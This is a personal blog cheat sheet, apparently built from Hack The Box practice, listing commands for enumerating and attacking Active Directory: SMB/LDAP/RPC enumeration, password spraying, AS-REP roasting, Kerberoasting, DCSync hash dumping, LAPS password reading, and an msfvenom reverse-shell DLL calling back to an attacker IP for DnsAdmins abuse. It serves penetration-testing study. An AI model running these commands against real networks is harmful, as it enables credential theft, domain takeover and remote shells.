---
layaout: post
title: Active Directory Tools & attacks
image: /assets/images/active_dir.png
date: 14-01-2025
categories: [Pentesting & Techniques]
tag: [cheat sheet, tools, Active Directory]
excerpt: "This document is a work-in-progress where I’m compiling a variety of techniques for enumerating and exploiting Active Directory environments. It will be updated over time with additional steps and insights as I continue to explore and refine the methodology."
---
![img-description](/assets/images/active_dir.png)

This document is a work-in-progress where I’m compiling a variety of techniques for enumerating and exploiting Active Directory environments. It will be updated over time with additional steps and insights as I continue to explore and refine the methodology
<p style="font-size:2em; font-weight:bold; margin-bottom: 0;">ENUMERATION TECHNICS</p>
<hr>

## ENUMERATING SMB
---
**SMB (Server Message Block)** is a network file sharing protocol used in Windows environments that allows applications to read and write to files, request services from server programs, and communicate with other devices on a network. It's commonly used for sharing files and printers between computers within a local network.
### Crackmapexec for smb
---
**CrackMapExec (CME) for SMB** is a tool used by penetration testers to automate post-exploitation tasks on Windows networks via the SMB protocol. It allows users to quickly enumerate SMB shares, perform lateral movement, dump hashes, execute remote commands, and check SMB authentication across multiple systems. CME is commonly used for internal network exploitation and vulnerability assessment in Windows environments.

````bash
crackmapexec smb 10.10.10.175 -u '' -p '' # Authenticate as anonymous
crackmapexec smb 10.10.10.175 -u 'guest' -p 'guest' # Authenticate as guest
crackmapexec smb 10.10.10.175 -u 'valid_creds' -p 'valid_creds' # Authenticate with valid credentials
crackmapexec smb 10.10.10.177 -u <username> -p <password> --exec -c "<command>" # Execute commands
````
### Smbclient
---
**Smbclient** is a command-line tool used to access and interact with shared files and printers over the SMB/CIFS protocol. It is commonly used in Linux and Unix-based systems to connect to Windows-based file shares.

````bash
smbclient //10.10.10.182/Data -U r.thompson # Connect to a specific share
smbclient -L <hostname> -U <username> # List shared resources on a server
smbclient //<hostname>/<share> -U <username> -c 'put <localfile> <remotefile>' # Upload an archive
smbclient //<hostname>/<share> -U <username> -c 'get <remotefile> <localfile>' # Download a file from the server
smbclient //10.10.10.182/Audit$ -U s.smith # With the follows commands you can dump all the avalibles files on a shared resource
smb: \> mask ""
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
````
## ENUMERATING RPC
---
**RPC** is a protocol used by programs to request services or perform tasks on a remote server or computer. It allows a program to execute code on another machine as if it were local, facilitating distributed computing. It’s widely used for client-server communication and allows seamless interaction between systems over a network.
### Rpcclient
---
**Rpcclient** is a command-line tool used to interact with the **Remote Procedure Call (RPC) service** on Windows machines, typically via SMB. It allows users to perform various tasks such as enumerating users, groups, shares, and more, by sending requests to the Windows RPC server.

````bash
rpcclient -U "" -N 10.10.10.169
	rpcclient $> enumdomusers
	rpcclient $> querydispinfo
# After dumping all the names we can use the following command to apply the correct format
grep -oP '(?<=user:\[)[^\]]+' raw_names.txt > users.txt
````

## ENUMERATING LDAP
---
**LDAP (Lightweight Directory Access Protocol)** is a protocol used to access and manage directory services over a network. It is commonly used for querying and modifying data in **directory services** such as Microsoft Active Directory (AD) or OpenLDAP.

### Ldapsearch
---
**Ldapsearch** is a command-line tool used to query and search data from an **LDAP (Lightweight Directory Access Protocol)** server, such as Active Directory or OpenLDAP. It allows you to search for specific objects (like users, groups, or computers) in the directory and retrieve their attributes. There's a <a href="https://gist.github.com/jonlabelle/0f8ec20c2474084325a89bc5362008a7" target="_blank">cheatsheet</a> for applying dierents filters  

````bash
ldapsearch -x -H ldap://10.10.10.182 -s base -b "" namingcontexts # Get names context over the domain
ldapsearch -x -H ldap://10.10.10.182 -b 'DC=cascade,DC=local' -s sub > ldap_dump.txt # Dump all the information
ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local" "(objectClass=person)" > dumping_users.txt # Applying filter for the dump
````
### Crackmapexec for ldap
---
**CrackMapExec (CME)** also supports **LDAP (Lightweight Directory Access Protocol)**, which allows you to interact with and enumerate data in directory services like Active Directory. With CME, you can query and interact with LDAP servers, perform user enumeration, and execute commands on the directory server.

````bash
crackmapexec ldap <hostname> -u <username> -p <password> --users # Enumerate users and groups
crackmapexec ldap <hostname> -u <username> -p <password> --domains # Enumerate domains
crackmapexec ldap <hostname> -u <username> -p <password> --search '(&(objectClass=user)(sAMAccountName=*administrator*))' # Enumerate specific atr
````

## ENUMERATING TLS
---
TLS encrypts communication between the client and server, ensuring security. It runs on port 3269 for secure Active Directory Global Catalog queries. Enumerating it is important because it may reveal valuable information about the domain, certificates, and potential attack vectors, all while being encrypted for protection.

````bash
openssl s_client -showcerts -connect 10.10.11.202:3269 | openssl x509 -noout -text
````

## VULNERABILITIES
---
### PASSWORD SPRYING WITH CRACKMAPEXEC
---
**Password spraying** is a brute-force attack method where an attacker attempts to log in to multiple accounts using the same common password (e.g., "Welcome123!"). Unlike traditional brute force, which targets one account with many passwords, password spraying avoids account lockouts by testing a single password across many different accounts.

````bash
crackmapexec smb 10.10.10.169 -u users.txt -p 'password.txt' --continue-on-success
````

### Kerberos pre-authentication vulnerability
---
#### Username-anarchy
---
**Username-anarchy** is a tool commonly used in **Active Directory enumeration** during security assessments. It is designed to find **usernames** based on common naming conventions used within organizations. The tool tries to identify likely usernames by leveraging patterns such as the combination of first names, last names, initials, and common organizational naming formats.

````bash
./username-anarchy --input-file /home/whare/hackthebox/maquinas/saune/users.txt --select-format first,flast,first.last,firstl > test_users.txt
````
#### AS-REP attack
---
An **AS-REP attack** exploits the **Kerberos authentication protocol** in Active Directory environments, targeting **user accounts** without pre-existing passwords or **non-Microsoft accounts**. When these accounts attempt to authenticate, they send an **AS-REP (Authentication Service Response)** to the domain controller, which is **encrypted**. This response can be intercepted and cracked offline to reveal the user's password, making this attack particularly effective against accounts without strong protections in place.

**Target**: User accounts, especially those without passwords or those using non-Microsoft identities.

````bash
impacket-GetNPUsers.py is an Impacket script used for AS-REP Roasting attacks in Active Directory. It retrieves users with Kerberos pre-authentication disabled, allowing attackers to capture and crack password hashes offline.
# COMANDS
impacket-GetNPUsers.py -no-pass -usersfile test_users.txt EGOTISTICAL-BANK.local/
impacket-GetNPUsers.py -usersfile users.txt -domain DOMAIN.local -no-pass
````

````bash
`Kerbrute` is a tool for performing brute-force attacks against Kerberos authentication. It can be used to enumerate valid usernames and perform AS-REP Roasting attacks to obtain password hashes from users with Kerberos pre-authentication disabled.
# COMANDS
kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL usernames.txt
kerbrute userenum -d DOMAIN -i users.txt
````
#### Kerberoasting
---
**Kerberoasting** targets **service accounts** in Active Directory environments. In this attack, an attacker requests **Service Tickets (TGS)** for service accounts with a registered **Service Principal Name (SPN)**. These tickets are encrypted with the service account's password hash, and once obtained, they can be cracked offline to reveal the plaintext password of the service account. This provides attackers with access to services and potential privilege escalation.

**Target**: Service accounts, which typically have weak or predictable passwords.

````bash
impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
````

#### DC-SYNC
---
A **DCSync attack** is a method used to simulate the behavior of a Domain Controller (DC) in order to retrieve password hashes of domain accounts from Active Directory. This attack exploits the replication protocol used by domain controllers to synchronize directory data. By performing a DCSync attack, an attacker can request the password hashes (or even clear-text passwords, if applicable) for specific accounts without needing direct access to the DC.

You will need one of the following requirements, usually printed on **BLOODHOUND**:

- **DS-REPLICATION-GET-CHANGES**: Allows obtaining information about changes in the directory.  
- **DS-REPLICATION-GET-CHANGES-ALL**: Allows obtaining all replication changes, including encrypted passwords.  
- **Elevated Permissions**: Members of **Domain Admins** or **Enterprise Admins** typically have these permissions.

````bash
./secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 # Dump credentials (if we have acces to them)
````

##  ABUSE OF PRIVILEGES
---
### Enumerating privileges
---
### Common commnds
---
````powershell
whoami -all
whoami -groups
````
#### Bloodhound
---
BloodHound is a tool for Active Directory auditing that helps map trust relationships, permissions, and privilege escalation paths within a domain. It visually identifies attack vectors by showing how an attacker could escalate privileges or move laterally within a network.

If we cant acces with WinRM:

````bash
bloodhound-python -c All -u P.Rosa -p 'Rosaisbest123' -d vintage.htb -ns 10.10.11.45
````

If we can acces with WinRM: SharpHound >

#### SharpHound
---
SharpHound is the data collection tool used by BloodHound. It scans the Active Directory environment to gather information about users, groups, permissions, and trust relationships. The data collected is then analyzed by BloodHound.

**Why we use SharpHound**:  
We use <a href="https://github.com/SpecterOps/SharpHound/releases/tag/v1.1.0" target="_blank">SharpHound</a> because it performs a more thorough scan of the domain from within the network. It reveals detailed relationships and permissions that may not be accessible remotely, providing critical information for privilege escalation.

**DISCLAIMER**: If you are using **BloodHound** installed from Kali's APT repository, you will need to run **SharpHound v1.1.0**. Otherwise, your data will not load properly.

## PRIVILEGED AD GROUP ABUSE
---
### AD-Recycle Bin
---
The **AD Recycle Bin** is a feature in Active Directory that allows the recovery of deleted objects, such as users, groups, or computers, without requiring backups. Being part of this group, we can potentially enumerate and extract information from deleted objects in the domain.

````powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects # Filter for deleted objects
Get-ADObject -Filter 'SAMAccountName -eq "User"' -IncludeDeletedObjects -Properties * # Filter for users
Get-ADObject -ldapfilter "(&(ObjectClass=user)(DisplayName=TempAdmin)(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *
Restore-ADObject -Identity <ObjectGUID> # Restore objects
````

### Dns-Admins
---
 **DnsAdmins** group consists of users who have special permissions to manage and configure DNS settings on a Windows machine. Members of this group typically have the ability to create, modify, and delete DNS records in Active Directory-integrated zones. By default, this group does not have permission to start or stop the DNS service, but administrators can assign additional privileges to members, which may include the ability to control the DNS service.

We create our malicious plugin using msfvenom

````bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f dll -o whare.dll
````

Next steps explianed <a href="https://whare1.github.io/posts/Resolute-Writeup/" target="_blank">on resolute writeup</a>

### LAPS_Readers
---
**LAPS_Readers** is a built-in group in Active Directory, specifically for **Local Administrator Password Solution (LAPS)**. Members of this group have **read-only access** to the local administrator passwords of managed machines in the domain. These passwords are automatically generated and stored securely in Active Directory by LAPS.

In short, **LAPS_Readers** allows members to **view** the local administrator passwords, but not to modify or manage them.

````powershell
Get-ADComputer -Filter * | Select-Object Name
Get-ADComputer -Identity "DC01" -Properties ms-Mcs-AdmPwd
````
![netrunner](/assets/images/netrunner.gif)